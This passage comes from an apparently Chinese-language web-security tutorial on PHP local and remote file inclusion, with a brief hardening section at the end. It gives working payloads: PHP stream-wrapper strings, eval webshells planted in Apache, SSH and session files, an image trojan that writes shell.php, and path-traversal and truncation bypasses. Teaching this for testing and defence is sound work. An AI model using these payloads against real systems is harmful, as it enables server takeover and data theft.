    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'name'</span> ];         <span class="hljs-comment">//文件名</span>
    <span class="hljs-variable">$uploaded_ext</span>  = <span class="hljs-title function_ invoke__">substr</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-title function_ invoke__">strrpos</span>( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">'.'</span> ) + <span class="hljs-number">1</span>);   <span class="hljs-comment">//文件后缀</span>
    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'size'</span> ];         <span class="hljs-comment">//文件大小</span>
    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'fupload'</span> ][ <span class="hljs-string">'tmp_name'</span> ];     <span class="hljs-comment">// 存储在服务器的文件的临时副本的名称</span>
    <span class="hljs-variable">$target_path</span> = <span class="hljs-string">"uploads\\"</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())).<span class="hljs-string">"."</span>.<span class="hljs-variable">$uploaded_ext</span>;
    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"jpeg"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"png"</span> || <span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">"zip"</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {
        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) {<span class="hljs-comment">// No</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;upload error&lt;/pre&gt;'</span>;
        }
        <span class="hljs-keyword">else</span> {<span class="hljs-comment">// Yes!</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span>.<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>).<span class="hljs-string">"\\<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
        }
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'</span>;
    }
}
 <span class="hljs-meta">?&gt;</span>
     
<span class="hljs-comment">//传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行）</span></code></pre>
<h3 id="24-data与phar">2.4 data://与phar://</h3>
<p><strong>data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。)</strong></p>
<p>利用条件:</p>
<ol>
<li>php版本大于等于php5.2</li>
<li>allow_url_fopen = On</li>
<li>allow_url_include = On</li>
</ol>
<pre><code class="hljs plaintext">poc:若纯文字没用可用[base64编码]
data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt;
?file=data://,&lt;?php phpinfo();?&gt;
?file=data://text/plain,&lt;?php phpinfo();?&gt;
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
?file=data:text/plain,&lt;?php phpinfo();?&gt;
?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</code></pre>
<p><strong>phar:// 有点类似zip://同样可以导致 任意代码执行。</strong></p>
<pre><code class="hljs plaintext">phar://中相对路径和绝对路径都可以使用
利用条件：
php版本大于等于php5.3.0</code></pre>
<pre><code class="hljs plaintext">poc:
假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下：
指定绝对路径
index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt

或者使用相对路径（这里test.zip就在当前目录下）
index.php?file=phar://test.zip/phpinfo.txt</code></pre>
<h3 id="25-expect伪协议">2.5 expect://伪协议</h3>
<p>expect://伪协议用来执行系统命令，但是需要安装拓展<br>
用法: <code>?file=expect://ls</code></p>
<h2 id="0x03-特殊文件包含">0x03 特殊文件包含</h2>
<p>服务器的中间件，ssh服务都有日志记录的功能。如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。<br>
如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。<br>
典型的日志文件包含：</p>
<ul>
<li>中间件日志文件包含</li>
<li>ssh日志文件包含</li>
</ul>
<p><strong>中间件日志文件包含</strong></p>
<p>利用条件：</p>
<ul>
<li>web中间件日志文件的存储位置已知，并且具有可读权限</li>
</ul>
<p>下面开始介绍日志文件包含漏洞利用步骤</p>
<p><strong>1. 将恶意代码写入到日志文件</strong></p>
<p>中间件开启了访问日志记录功能，会访问日志写入到日志文件中。<br>
假设访问URL：<a target="_blank" rel="noopener" href="http://192.168.1.2/xxx/index.php">http://192.168.1.2/xxx/index.php</a><br>
发现会在日志文件中有如下内容：</p>
<pre><code class="hljs csharp">[<span class="hljs-meta">root@aaa</span>]<span class="hljs-meta">#less /var/log/httpd/access_log</span>
<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.200</span> - - [<span class="hljs-number">09</span>/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">31</span>:<span class="hljs-number">20</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">"GET /xxx/index.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">86.</span>...</code></pre>
<p>中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。<br>
利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去：<br>
添加恶意代码：<code>http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt;</code><br>
此时会提示404，但是不急<br>
查看日志文件，发现已经将内容写入</p>
<pre><code class="hljs perl">[root@aaa]<span class="hljs-comment">#less /var/log/httpd/access_log</span>
<span class="hljs-number">192.168</span>.<span class="hljs-number">1.200</span> - - [09/Aug/<span class="hljs-number">2021</span>:<span class="hljs-number">19</span>:<span class="hljs-number">35</span>:<span class="hljs-number">23</span> +080<span class="hljs-number">0</span>] <span class="hljs-string">"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1"</span> <span class="hljs-number">404</span> <span class="hljs-number">826</span>....</code></pre>
<p>虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用<br>
<strong>可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码</strong><br>
查看日志文件，内容如下</p>
<pre><code class="hljs php-template"><span class="language-xml">[root@aaa]#less /var/log/httpd/access_log</span>
<span class="language-xml">192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] "GET /xxx/</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">123</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> HTTP/1.1" 404 302....</span></code></pre>
<p>恶意代码成功写入</p>
<p><strong>2. 文件包含日志文件</strong></p>
<p>要执行文件包含，必须要知道日志文件的位置。<br>
常见的中间件日志文件都有默认的存储路径，比如Apache的中间件日志文件存在/var/log/httpd/目录下，文件名叫access_log<br>
输入测试语句<code>http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log</code><br>
之后在向网页传入POST参数：<code>123=phpinfo</code><br>
即可显示出phpinfo的内容</p>
<h3 id="31-包含apache日志文件">3.1 包含Apache日志文件</h3>
<p><strong>WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。</strong></p>
<pre><code class="hljs plaintext">利用条件：
对日志文件可读
知道日志文件的存储目录

注意：
一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知

日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式</code></pre>
<p><strong>Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。<br>
  如果访问一个不存在的资源时，如<a target="_blank" rel="noopener" href="http://www.xxxx.com/">http://www.xxxx.com/</a><!--?php phpinfo(); ?-->,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把<!--?php phpinfo(); ?--> 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。</strong></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/my1e3/p/5854897.html">1.包含日志文件getshell</a><br>
     <a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">2.一道包含日志文件的CTF题</a></p>
<p>这里提供一道包含日志的CTF题目：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/06/SHACTF-2017-Web-writeup/#Methon-Two">SHACTF-2017- Bon Appétit (100)-writeup</a></p>
<h3 id="32-包含ssh-log日志文件">3.2 包含SSH log日志文件</h3>
<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
<p>下面介绍漏洞利用步骤</p>
<p><strong>1. 将恶意代码写入文件</strong></p>
<p>SSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中<br>
将连接的用户名设置成恶意代码，用命令连接受害者的服务器ip(192.168.1.1)的ssh服务<br>
<code>ssh "&lt;?php @eval($_POST[123]);?&gt;"@192.168.1.1</code><br>
查看日志文件/var/log/auth.log，可以观察到恶意代码已经写入到日志文件</p>
<p><strong>2. 使用文件包含日志文件</strong></p>
<p>测试输入语句：<code>http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log</code><br>
之后再向网页传入POST参数：<code>123=phpinfo</code><br>
就可以出现phpinfo的内容了</p>
<p>参考：[<a target="_blank" rel="noopener" href="http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/">RCE with LFI and SSH Log Poisoning</a>]</p>
<h3 id="33-包含environ">3.3 包含environ</h3>
<p>利用条件：</p>
<ol>
<li>php以cgi方式运行，这样environ才会保持UA头。</li>
<li>environ文件存储位置已知，且environ文件可读。</li>
</ol>
<p>姿势：</p>
<p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p>
<p>可以参考这个：</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://websecuritylog.blogspot.jp/2010/06/procselfenviron-injection.html">The proc/self/environ Injection</a></li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/papers/12886/">shell via LFI - proc/self/environ method</a></li>
</ol>
<h3 id="34-包含fd">3.4 包含fd</h3>
<p>与前面的方法类似<code>/proc/self/environ</code>，可以将代码引入 proc 日志文件中，这些代码可以通过易受攻击的 LFI 脚本执行。通常，您会使用 burp 或 curl 将 PHP 代码注入到<code>referer</code>.</p>
<p>这种方法有点棘手，因为包含 Apache 错误日志信息的 proc 文件在<code>/proc/self/fd/</code>等下发生了变化<code>/proc/self/fd/2</code>。我建议使用 Burp Intruder + FuzzDB 的<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">LFI-FD</a><code>/proc/self/fd/10</code>暴力破解 /proc/self/fd/ 目录的目录结构<a target="_blank" rel="noopener" href="https://github.com/tennc/fuzzdb/blob/master/dict/BURP-PayLoad/LFI/LFI-FD-check.txt">-Check.txt</a>可能的 proc 文件列表，然后您可以监控返回的页面大小并进行调查。</p>
<p>参考： <a target="_blank" rel="noopener" href="https://highon.coffee/blog/lfi-cheat-sheet/#procselffd-lfi-method">LFI Cheat Sheet：/proc/self/environ LFI Method</a></p>
<h3 id="35-包含session">3.5 包含SESSION</h3>
<p><strong>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</strong></p>
<pre><code class="hljs plaintext">利用条件：
找到Session内的可控变量
Session文件可读写，并且知道存储路径

一般通过以下两种方式获取session的存储位置：

通过phpinfo的信息获取session的存储位置。
通过phpinfo的信息获取session.save_path
通过猜测默认的session存储位置进行尝试
通常Linux中的Session的默认存储位置在/var/lib/php/session目录下</code></pre>
<p><strong>php的session文件的保存路径可以在phpinfo的session.save_path看到。</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321200640758.png" alt="image-20230321200640758"></p>
<pre><code class="hljs plaintext">session常见存储路径：

/var/lib/php/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。</code></pre>
<p>参考文章：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/09/%E4%B8%80%E9%81%93CTF%E9%A2%98%EF%BC%9APHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">一道SESSION包含的CTF题</a></p>
<p><strong>示例分析：</strong></p>
<p>session文件包含代码如下</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-variable">$ctfs</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'ctfs'</span>];
<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'username'</span>]=<span class="hljs-variable">$ctfs</span></code></pre>
<p>此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。<br>
攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。</p>
<p><strong>漏洞分析</strong></p>
<p>上面的代码满足Session文件包含的两个要求</p>
<ul>
<li>PHP代码将会获取ctfs变量的值存入到session中</li>
<li>Session的默认 存储位置是/var/lib/php/session</li>
</ul>
<p>访问URL：<code>http://www.abc.com/xxx/session.php?ctfs=a</code> 会在/var/lib/php/session目录下降ctfs传入的值存储到session中<br>
Session的文件名以sess_开头，后跟Sessionid，Sessionid可以通过开发者模式获取：<br>
单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容</p>
<p>假设通过开发者模式获取到的sessionid的值为hufh7hsdf392eurh4,所以session的文件名为<code>sess_hufh7hsdf392eurh4</code><br>
在/var/lib/php/session目录下查看此文件，内容为：<strong>username|s:4:“a”</strong></p>
<p><strong>漏洞利用</strong></p>
<p>通过上面的分析，可以得知，向ctfs参数传入的内容会存储到session文件中。<br>
如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行getshell</p>
<p>例如：访问代码<code>http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;</code>后，会在/var/lib/php/session目录下降ctfs的值写入session文件<br>
session文件的内容为：<code>username|s:18:"&lt;?php phpinfo();?&gt;"</code>.</p>
<p><strong>攻击步骤</strong></p>
<ul>
<li>将恶意代码写入session文件</li>
<li>攻击者可以通过PHPinfo或者猜测到session存放的位置</li>
<li>通过开发者模式可以获得文件名称</li>
<li>通过本地文件包含漏洞可以解析session文件达到攻击的目的</li>
</ul>
<p>比如：<code>http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2</code></p>
<h3 id="36-包含临时文件">3.6 包含临时文件</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321200926394.png" alt="image-20230321200926394"></p>
<p><strong>php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\winsdows\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。</strong></p>
<p><strong>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。</strong></p>
<p><strong>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](<a target="_blank" rel="noopener" href="https://www.insomniasec.com/downloads/publications/LFI">https://www.insomniasec.com/downloads/publications/LFI</a> With PHPInfo Assistance.pdf)</strong></p>
<p><strong>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：<a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/08/22/XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5-2017-babyweb-writeup/">XMAN夏令营-2017-babyweb-writeup</a></strong></p>
<h3 id="37-包含上传文件">3.7 包含上传文件</h3>
<p><strong>很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。</strong></p>
<p><strong>图片马的制作方式如下，在cmd控制台下输入：</strong></p>
<pre><code class="hljs plaintext">进入1.jph和2.php的文件目录后，执行：

copy  1.jpg/b+2.php  3.jpg

将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg</code></pre>
<p><strong>假设已经上传一句话图片木马到服务器，路径为<code>/upload/201811.jpg</code></strong><br>
<strong>图片代码如下：</strong></p>
<pre><code class="hljs plaintext">&lt;?fputs(fopen("shell.php","w"),"&lt;?php eval($_POST['pass']);?&gt;")?&gt;</code></pre>
<p><strong>然后访问URL：<code>http://www.xxxx.com/index.php?page=./upload/201811.jpg</code>，包含这张图片，将会在<code>index.php</code>所在的目录下生成<code>shell.php</code></strong></p>
<h3 id="38-其他包含姿势">3.8 其他包含姿势</h3>
<pre><code class="hljs plaintext">包含SMTP(日志)
包含xss</code></pre>
<h2 id="0x04-绕过方法">0x04 绕过方法</h2>
<h3 id="41-指定前缀绕过">4.1 指定前缀绕过</h3>
<h4 id="411-目录遍历">4.1.1 目录遍历</h4>
<p><strong>使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php</strong><br>
<strong>测试代码如下：</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
	<span class="hljs-comment">//前缀</span>
	<span class="hljs-keyword">include</span> <span class="hljs-string">"/var/www/html/"</span>.<span class="hljs-variable">$file</span>;

	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p><strong>现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问：</strong></p>
<pre><code class="hljs plaintext">include.php?file=../../log/flag.txt</code></pre>
<p><strong>则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。</strong></p>
<h4 id="412-编码绕过">4.1.2 编码绕过</h4>
<p><strong>服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。</strong><br>
<strong>1.利用url编码</strong></p>
<pre><code class="hljs plaintext">../

    %2e%2e%2f
    ..%2f
    %2e%2e/

..\

    %2e%2e%5c
    ..%5c
    %2e%2e\</code></pre>
<p><strong>2.二次编码</strong></p>
<pre><code class="hljs plaintext">../

    %252e%252e%252f
..\

    %252e%252e%255c</code></pre>
<p><strong>3.容器/服务器的编码方式</strong></p>
<pre><code class="hljs plaintext">../

    ..%c0%af
        注：Why does Directory traversal attack %C0%AF work?

    %c0%ae%c0%ae/
    
        注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）
        Apache Tomcat Directory Traversal

..\

    ..%c1%9c</code></pre>
<p>注：那里的超链接是：<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></p>
<h3 id="42-指定后缀绕过">4.2 指定后缀绕过</h3>
<p><strong>后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码：</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
	<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
	<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"file"</span>];
	<span class="hljs-comment">//后缀</span>
	<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">".txt"</span>;

	<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="421-利用url">4.2.1 利用url</h4>
<p><strong>在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。<br>
可参考此文章：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2c07fbb52b45">URI’s fragment</a></strong></p>
<p><strong>完整url格式：</strong></p>
<pre><code class="hljs plaintext">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></pre>
<pre><code class="hljs plaintext">query(?)

    [访问参数] ?file=http://localhost:8081/phpinfo.php?
    [拼接后]  ?file=http://localhost:8081/phpinfo.php?.txt
    
    上述可能是?截断：
    ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下：
    
   空格绕过
  这里也是一样需要使用编码%20进行绕过，不能直接输入空格。
  ?file=http://localhost:8081/phpinfo.php%20.txt
  
  #号绕过：
  ?file=http://localhost:8081/phpinfo.php%23.txt
	注：这里需要对#进行url编码，#的url编码为%23</code></pre>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321203740146.png" alt="image-20230321203740146"></p>
<pre><code class="hljs plaintext">fragment(#)

    [访问参数] ?file=http://localhost:8081/phpinfo.php%23
    [拼接后]  ?file=http://localhost:8081/phpinfo.php#.txt</code></pre>
<p><strong>Example：</strong>（设在根目录下有flag2.txt文件）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321203837999.png" alt="image-20230321203837999"></p>
<p><strong>其他绕过方式：</strong></p>
<p>一些常见的特殊字符URL编码：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230618164128542.png" alt="image-20230618164128542"></p>
<p>这里可以用burp爆破一遍，看哪个能用</p>
<h4 id="422-利用协议">4.2.2 利用协议</h4>
<p><strong>利用zip://和phar://，由于整个压缩包都是我们的可控参数，那么只需要知道他们的后缀，便可以自己构建。</strong></p>
<pre><code class="hljs plaintext">zip://

    [访问参数] ?file=zip://D:\zip.jpg%23phpinfo
    [拼接后]  ?file=zip://D:\zip.jpg#phpinfo.txt

phar://

    [访问参数] ?file=phar://zip.zip/phpinfo
    [拼接后]  ?file=phar://zip.zip/phpinfo.txt</code></pre>
<p><strong>Example：</strong><br>
<em><em>(我的环境根目录中有php.zip压缩包，内含phpinfo.txt，其中包含代码<!--?php phpinfo();?-->)）</em><br>
所以分别构造payload为：</em>*</p>
<pre><code class="hljs plaintext">?file=zip://D:\PHPWAMP_IN3\wwwroot\php.zip%23phpinfo

?file=phar://../../php.zip/phpinfo</code></pre>
<p><strong>对应的结果分别为：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321204222933.png" alt="image-20230321204222933"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230321204231560.png" alt="image-20230321204231560"></p>
<h4 id="423-长度截断">4.2.3 长度截断</h4>
<pre><code class="hljs plaintext">利用条件：

    php版本&lt;php 5.2.8

原理：

    Windows下目录最大长度为256字节，超出的部分会被丢弃
    Linux下目录最大长度为4096字节，超出的部分会被丢弃。

利用方法：

    只需要不断的重复 ./(Windows系统下也可以直接用 . 截断)</code></pre>
<pre><code class="hljs plaintext">?file=shell.php./././。。省略。。
//指定的后缀的被丢弃，成功包含木马文件</code></pre>
<p><strong>则指定的后缀.txt会在达到最大值后会被直接丢弃掉</strong></p>
<h4 id="424-00截断">4.2.4 %00截断</h4>
<pre><code class="hljs plaintext">HP魔术引导介绍

  当sql句中含有单引号，双引号，反斜杠和NUL时，这时候如果不对这些符号进行转义，写入数据库时就会出错，而魔术引号magic_quotes_gpc()就是对这些符号进行转义以便能把数据正确写入数据库。不过该参数在php.ini文件中修改。
  PHP魔术引号特性已自 PHP5.3.0起废弃并将自PHP5.4.0起移除。也就是说在本实验环境的PHP版本中仍是存在的</code></pre>
<pre><code class="hljs plaintext">在低版本中php读取文件名时认为%00是终止符，对于%00后面的内容就会失效
 
利用条件：

    magic_quotes_gpc = Off
    php版本 &lt; php 5.3.4

利用方法：

    直接在文件名的最后加上%00来截断指定的后缀名
      ?file=shell.php%00
//现阶段%00截断不常用</code></pre>
<h4 id="425-点号截断">4.2.5 点号截断</h4>
<pre><code class="hljs plaintext">原理：
    windows系统 点号 长于 256，超出的部分会被丢弃；
    linux系统 点号 长于 4096，超出的部分会被丢弃；
示例：
http://192.168.100.150/test_include/index.php?page=1.png.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................

burp抓包修改即可</code></pre>
<h4 id="426-双写绕过">4.2.6 双写绕过</h4>
<p><strong>当写入文件时，发现删除某些特殊字符，我们可以判断是删除了其中字符，例如”php"，“…/”，只需</strong><br>
<strong>再增加一个使其删除后得到我们需要的，需要注意绝对路径与相对路径。</strong></p>
<h4 id="427-大小写混合绕过">4.2.7 大小写混合绕过</h4>
<p><strong>如果在文件包含时，服务器对我们传入的参数没有进行严格过滤，比如没没有对大小写进行过滤，我们可以使用大小写混合进行绕过。</strong></p>
<h2 id="0x05-漏洞防护">0x05 漏洞防护</h2>
<p><strong>1、使用str_replace等方法过滤掉危险字符</strong></p>
<p><strong>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</strong></p>
<p><strong>3、php版本升级，防止%00截断</strong></p>
<p><strong>4、对上传的文件进行重命名，防止被读取</strong></p>
<p><strong>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</strong></p>
<p><strong>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</strong></p>
<pre><code class="hljs plaintext">./表示当前位置路径，../表示上一级路径位置，在linux中同样适用。</code></pre>
<pre><code class="hljs plaintext">3）一些常见的敏感信息路径：

Windows系统：

    c:\boot.ini // 查看系统版本
